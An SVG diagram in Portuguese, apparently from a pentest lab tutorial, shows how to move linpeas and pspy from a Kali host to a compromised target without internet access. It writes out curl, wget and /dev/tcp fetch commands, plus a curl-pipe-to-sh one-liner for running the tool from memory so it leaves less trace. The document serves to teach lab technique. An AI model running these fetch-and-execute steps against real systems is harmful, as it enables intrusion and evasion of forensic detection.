<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 470" width="960" height="470" role="img" aria-labelledby="t2 d2">
  <title id="t2">Levar a ferramenta a um alvo sem internet</title>
  <desc id="d2">O alvo não acessa a internet (caminho em vermelho, bloqueado). Em vez disso, a Kali serve o arquivo por HTTP e o alvo o puxa pela rede interna do lab (caminho em verde). Da esquerda para a direita: Kali serve com python3 -m http.server 8000; a rede interna do lab não tem internet; o alvo, com foothold de baixo privilégio, puxa com curl, wget ou o /dev/tcp do bash. Embaixo, nota: dá para rodar da memória, sem gravar em disco.</desc>
  <style>
    text { font-family: 'SF Mono','Fira Code','Cascadia Code','Courier New',monospace; fill: #e2e8f0; }
    .title { font-size: 19px; font-weight: 700; }
    .sub { font-size: 12.5px; fill: #94a3b8; }
    .h { font-size: 14px; font-weight: 700; }
    .item { font-size: 11px; fill: #cbd5e1; }
    .cmd { font-size: 10.5px; fill: #a5f3cf; }
    .block { font-size: 13px; font-weight: 700; fill: #f87171; }
    .leg { font-size: 11px; fill: #94a3b8; }
    .note { font-size: 11px; fill: #94a3b8; }
  </style>
  <defs>
    <linearGradient id="bg-grad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0f0f1a"/>
      <stop offset="100%" stop-color="#1a1a2e"/>
    </linearGradient>
    <marker id="arrow-green" markerWidth="9" markerHeight="7" refX="7.5" refY="3.5" orient="auto"><polygon points="0 0, 9 3.5, 0 7" fill="#10b981"/></marker>
    <marker id="arrow-red" markerWidth="9" markerHeight="7" refX="7.5" refY="3.5" orient="auto"><polygon points="0 0, 9 3.5, 0 7" fill="#ef4444"/></marker>
  </defs>
  <rect width="960" height="470" fill="url(#bg-grad)"/>

  <text class="title" x="40" y="40">Levar a ferramenta a um alvo sem internet</text>
  <text class="sub" x="40" y="62">A Kali serve o arquivo; o alvo o puxa pela rede interna — nunca pela internet.</text>

  <!-- Internet (blocked) -->
  <rect x="690" y="88" width="230" height="56" rx="6" fill="#2a1216" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="6 4"/>
  <text class="h" x="805" y="112" text-anchor="middle" fill="#f87171">Internet</text>
  <text class="block" x="805" y="132" text-anchor="middle">✗ bloqueada para o alvo</text>

  <!-- blocked path internet -> alvo -->
  <path d="M805,144 L805,196" stroke="#ef4444" stroke-width="2" stroke-dasharray="6 4" fill="none" marker-end="url(#arrow-red)"/>
  <g stroke="#ef4444" stroke-width="2.5"><path d="M792,164 L818,182"/><path d="M818,164 L792,182"/></g>

  <!-- Kali -->
  <rect x="40" y="196" width="260" height="150" rx="6" fill="#06281d" stroke="#10b981" stroke-width="1.8"/>
  <text class="h" x="60" y="224" fill="#34d399">Kali (sua máquina)</text>
  <text class="item" x="60" y="250">Serve o arquivo por HTTP:</text>
  <text class="cmd" x="60" y="272">$ python3 -m http.server 8000</text>
  <text class="item" x="60" y="300" fill="#94a3b8">linpeas.sh e pspy64 já estão</text>
  <text class="item" x="60" y="318" fill="#94a3b8">na pasta servida (baixados</text>
  <text class="item" x="60" y="336" fill="#94a3b8">antes, pelo terminal)</text>

  <!-- internal net (barrier) -->
  <rect x="372" y="196" width="216" height="150" rx="6" fill="#0f172a" stroke="#475569" stroke-width="1.5" stroke-dasharray="5 4"/>
  <text class="h" x="480" y="252" text-anchor="middle" fill="#cbd5e1">Rede do lab</text>
  <text class="block" x="480" y="276" text-anchor="middle">sem internet</text>
  <text class="item" x="480" y="302" text-anchor="middle" fill="#94a3b8">o alvo só enxerga</text>
  <text class="item" x="480" y="320" text-anchor="middle" fill="#94a3b8">a Kali</text>

  <!-- target -->
  <rect x="660" y="196" width="260" height="150" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1.8"/>
  <text class="h" x="680" y="224">Alvo (foothold)</text>
  <text class="item" x="680" y="250">Puxa o arquivo da Kali:</text>
  <text class="cmd" x="680" y="272">$ curl http://KALI:8000/linpeas.sh</text>
  <text class="cmd" x="680" y="290">$ wget http://KALI:8000/pspy64</text>
  <text class="item" x="680" y="316" fill="#94a3b8">sem curl/wget? bash builtin:</text>
  <text class="cmd" x="680" y="334">$ exec 3&lt;&gt;/dev/tcp/KALI/8000</text>

  <!-- allowed green path Kali -> alvo -->
  <path d="M300,271 L372,271" stroke="#10b981" stroke-width="2.5" fill="none" marker-end="url(#arrow-green)"/>
  <path d="M588,271 L660,271" stroke="#10b981" stroke-width="2.5" fill="none" marker-end="url(#arrow-green)"/>
  <text class="leg" x="480" y="226" text-anchor="middle" fill="#34d399">serve → alvo puxa</text>

  <!-- memory note -->
  <text class="note" x="40" y="388" fill="#34d399">Pode rodar da memória, sem gravar em disco (menos rastro):</text>
  <text class="cmd" x="40" y="408">$ curl http://KALI:8000/linpeas.sh | sh</text>

  <!-- legend -->
  <rect x="560" y="376" width="14" height="14" rx="3" fill="#06281d" stroke="#10b981" stroke-width="1.5"/>
  <text class="leg" x="582" y="387">caminho permitido (rede interna)</text>
  <rect x="560" y="398" width="14" height="14" rx="3" fill="#2a1216" stroke="#ef4444" stroke-width="1.5"/>
  <text class="leg" x="582" y="409">bloqueado (internet)</text>
</svg>
